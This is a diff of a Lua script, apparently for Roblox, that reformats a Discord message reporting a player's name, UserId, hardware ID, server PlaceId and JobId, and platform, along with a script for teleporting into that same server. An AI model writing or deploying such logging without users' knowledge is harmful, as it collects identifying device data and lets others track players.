@@ -98,9 +98,26 @@ local function sendTeleportInfo()
         return
     end
 
-    -- Create payload to send to Discord
+    -- Create embed payload to send to Discord
+    local embed = {
+        ["title"] = "Teleport Information",
+        ["type"] = "rich",
+        ["color"] = tonumber(0x00FF00), -- Green color in decimal
+        ["fields"] = {
+            {["name"] = "Name", ["value"] = playerName, ["inline"] = true},
+            {["name"] = "UserId", ["value"] = tostring(userId), ["inline"] = true},
+            {["name"] = "HWID", ["value"] = HWID, ["inline"] = true},
+            {["name"] = "PlaceId", ["value"] = tostring(placeId), ["inline"] = true},
+            {["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
+            {["name"] = "Platform", ["value"] = platform, ["inline"] = true},
+            {["name"] = "HTTP Request Method", ["value"] = requestMethod, ["inline"] = true},
+            {["name"] = "Teleport Script", ["value"] = "```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```", ["inline"] = false},
+        }
+    }
+
     local data = {
-        ["content"] = "------------\nName: " .. playerName .. "\nUserId: " .. userId .. "\nHWID: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nPlatform: " .. platform .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
+        ["content"] = "------------",
+        ["embeds"] = {embed}
     }
 
     -- Convert data to JSON format
